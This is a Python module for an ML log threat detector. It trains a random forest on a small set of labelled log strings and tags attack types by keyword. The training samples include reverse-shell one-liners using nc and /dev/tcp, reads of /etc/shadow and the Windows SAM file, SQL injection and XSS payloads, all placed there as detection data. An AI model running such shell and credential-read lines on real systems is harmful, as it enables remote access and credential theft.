import pickle
import os
from typing import Dict, List
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import re

from app.config import settings


class MLModel:
    """
    Machine Learning model for threat detection
    """
    
    def __init__(self):
        self.model = None
        self.vectorizer = None
        self.is_trained = False
        
        # Try to load pre-trained model
        self._load_model()
        
        # If no model exists, create and train a simple one
        if not self.is_trained:
            self._create_simple_model()
    
    def _load_model(self):
        """
        Load pre-trained model from disk
        """
        try:
            model_path = settings.ML_MODEL_PATH
            
            if os.path.exists(model_path):
                with open(model_path, 'rb') as f:
                    data = pickle.load(f)
                    self.model = data['model']
                    self.vectorizer = data['vectorizer']
                    self.is_trained = True
                    print("✓ ML model loaded successfully")
            else:
                print("⚠ No pre-trained model found, creating new one")
        
        except Exception as e:
            print(f"⚠ Error loading ML model: {str(e)}")
            self.is_trained = False
    
    def _create_simple_model(self):
        """
        Create a simple model with basic training data for demo
        """
        try:
            # Sample training data (in production, use CICIDS2017 or similar)
            training_data = [
                # Malicious samples
                ("SELECT * FROM users WHERE '1'='1'", 1),
                ("'; DROP TABLE users--", 1),
                ("<script>alert('XSS')</script>", 1),
                ("../../../etc/passwd", 1),
                ("Failed password for invalid user", 1),
                ("; cat /etc/shadow", 1),
                ("| nc -e /bin/sh 192.168.1.1 4444", 1),
                ("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", 1),
                ("' OR 1=1 --", 1),
                ("<img src=x onerror=alert(1)>", 1),
                ("../../windows/system32/config/sam", 1),
                ("Failed login attempt from", 1),
                ("authentication failure for user", 1),
                ("Invalid user admin from", 1),
                ("403 Forbidden", 1),
                
                # Normal samples
                ("User logged in successfully", 0),
                ("GET /index.html HTTP/1.1 200", 0),
                ("Service started successfully", 0),
                ("Database connection established", 0),
                ("User session created", 0),
                ("Configuration loaded", 0),
                ("System backup completed", 0),
                ("Email sent successfully", 0),
                ("Cache cleared", 0),
                ("File uploaded: document.pdf", 0),
                ("User profile updated", 0),
                ("POST /api/data 200 OK", 0),
                ("Connection from 192.168.1.100 accepted", 0),
                ("INFO: Application started", 0),
                ("DEBUG: Processing request", 0)
            ]
            
            # Separate features and labels
            X_text = [item[0] for item in training_data]
            y = [item[1] for item in training_data]
            
            # Create TF-IDF vectorizer
            self.vectorizer = TfidfVectorizer(
                max_features=100,
                ngram_range=(1, 2),
                min_df=1
            )
            
            # Transform text to features
            X = self.vectorizer.fit_transform(X_text)
            
            # Train Random Forest model
            self.model = RandomForestClassifier(
                n_estimators=50,
                max_depth=10,
                random_state=42
            )
            self.model.fit(X, y)
            
            self.is_trained = True
            
            # Save the model
            self._save_model()
            
            print("✓ Simple ML model created and trained")
        
        except Exception as e:
            print(f"✗ Error creating ML model: {str(e)}")
            self.is_trained = False
    
    def _save_model(self):
        """
        Save trained model to disk
        """
        try:
            os.makedirs(os.path.dirname(settings.ML_MODEL_PATH), exist_ok=True)
            
            with open(settings.ML_MODEL_PATH, 'wb') as f:
                pickle.dump({
                    'model': self.model,
                    'vectorizer': self.vectorizer
                }, f)
            
            print(f"✓ Model saved to {settings.ML_MODEL_PATH}")
        
        except Exception as e:
            print(f"✗ Error saving model: {str(e)}")
    
    def predict_threat(self, log_text: str) -> Dict:
        """
        Predict if a log entry is a threat
        """
        if not self.is_trained or self.model is None:
            return {
                'is_threat': False,
                'confidence': 0.0,
                'attack_type': None
            }
        
        try:
            # Preprocess log text
            processed_text = self._preprocess_text(log_text)
            
            # Transform to features
            X = self.vectorizer.transform([processed_text])
            
            # Predict
            prediction = self.model.predict(X)[0]
            probabilities = self.model.predict_proba(X)[0]
            
            # Get confidence (probability of threat class)
            confidence = probabilities[1] if len(probabilities) > 1 else probabilities[0]
            
            # Determine attack type based on keywords
            attack_type = self._classify_attack_type(log_text)
            
            return {
                'is_threat': bool(prediction == 1 and confidence > settings.THREAT_DETECTION_THRESHOLD),
                'confidence': float(confidence),
                'attack_type': attack_type if prediction == 1 else None
            }
        
        except Exception as e:
            print(f"Error in prediction: {str(e)}")
            return {
                'is_threat': False,
                'confidence': 0.0,
                'attack_type': None
            }
    
    def _preprocess_text(self, text: str) -> str:
        """
        Preprocess log text for ML model
        """
        # Convert to lowercase
        text = text.lower()
        
        # Remove special characters but keep important ones
        text = re.sub(r'[^a-z0-9\s\.\-\_\:\(\)\[\]\{\}\/\\\'\"]', ' ', text)
        
        # Remove extra whitespace
        text = ' '.join(text.split())
        
        return text
    
    def _classify_attack_type(self, log_text: str) -> str:
        """
        Classify the type of attack based on keywords
        """
        log_lower = log_text.lower()
        
        if any(word in log_lower for word in ['select', 'union', 'drop', 'insert', 'update', 'delete', 'sql']):
            return 'SQL Injection'
        
        if any(word in log_lower for word in ['script', 'javascript', 'onerror', 'onload', 'xss']):
            return 'XSS'
        
        if any(word in log_lower for word in ['../', '..\\', 'etc/passwd', 'traversal']):
            return 'Directory Traversal'
        
        if any(word in log_lower for word in ['failed', 'invalid', 'authentication', 'password', 'login']):
            return 'Brute Force'
        
        if any(word in log_lower for word in ['bash', 'sh', 'nc', 'wget', 'curl', 'command']):
            return 'Command Injection'
        
        if any(word in log_lower for word in ['scan', 'nmap', 'probe']):
            return 'Port Scan'
        
        return 'Unknown Threat'
    
    def predict_batch(self, log_texts: List[str]) -> List[Dict]:
        """
        Predict threats for multiple logs
        """
        return [self.predict_threat(text) for text in log_texts]
    
    def retrain(self, training_data: List[tuple]):
        """
        Retrain the model with new data
        """
        try:
            X_text = [item[0] for item in training_data]
            y = [item[1] for item in training_data]
            
            # Transform text to features
            X = self.vectorizer.transform(X_text)
            
            # Retrain model
            self.model.fit(X, y)
            
            # Save updated model
            self._save_model()
            
            print("✓ Model retrained successfully")
            
            return True
        
        except Exception as e:
            print(f"✗ Error retraining model: {str(e)}")
            return False
